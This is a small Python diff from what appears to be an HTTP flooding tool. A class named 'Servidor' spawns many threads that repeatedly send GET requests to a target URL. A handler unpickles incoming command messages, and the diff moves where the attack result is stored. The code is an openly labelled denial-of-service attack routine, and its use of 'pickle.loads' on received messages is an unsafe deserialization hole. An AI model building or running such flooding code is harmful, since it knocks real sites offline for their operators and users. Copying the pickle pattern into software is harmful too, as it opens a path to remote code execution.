@@ -54,6 +54,7 @@ class Servidor():
         try:
             sendTo = requests.get(url)
             sendTo
+            self.attackResult = str(requests.get(url))
         except requests.exceptions.RequestException as e:
             self.attackResult = str(e)
             
@@ -61,7 +62,6 @@ class Servidor():
         for i in range(cuantity):
             t = threading.Thread(target=self.SendAttackTo, args=(url,))
             t.start()
-        self.attackResult = str(requests.get(url))
     def HandleAttack(self, msg):
         message = pickle.loads(msg)
         if message.msg[0] == '!':
